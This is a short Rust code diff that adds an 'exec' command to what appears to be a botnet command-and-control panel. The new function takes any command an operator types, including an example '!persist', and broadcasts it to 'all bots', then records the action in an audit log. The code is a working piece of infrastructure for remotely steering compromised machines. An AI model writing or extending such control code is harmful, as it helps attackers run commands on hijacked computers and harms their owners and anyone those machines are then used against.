@@ -545,3 +545,24 @@ pub async fn handle_update_command(client: &Arc<Client>, state: &Arc<AppState>, 
     
     Ok(())
 }
+
+pub async fn handle_exec_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
+    if parts.len() < 2 {
+        client.write(b"\x1b[38;5;196m[X] Usage: exec <command>\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: exec !persist\n\r").await?;
+        return Ok(());
+    }
+    let command = parts[1..].join(" ");
+    
+    client.write(format!("\x1b[38;5;226m[!] Broadcasting command to all bots: {}\n\r", command).as_bytes()).await?;
+    
+    state.bot_manager.broadcast_command(&command).await;
+    
+    client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] Command broadcast complete.\n\r").await?;
+    
+    let audit_event = AuditLog::new(client.user.username.clone(), "BROADCAST_COMMAND".to_string(), "SUCCESS".to_string())
+        .with_target(command);
+    let _ = log_audit_event(audit_event, &state.pool).await;
+    
+    Ok(())
+}
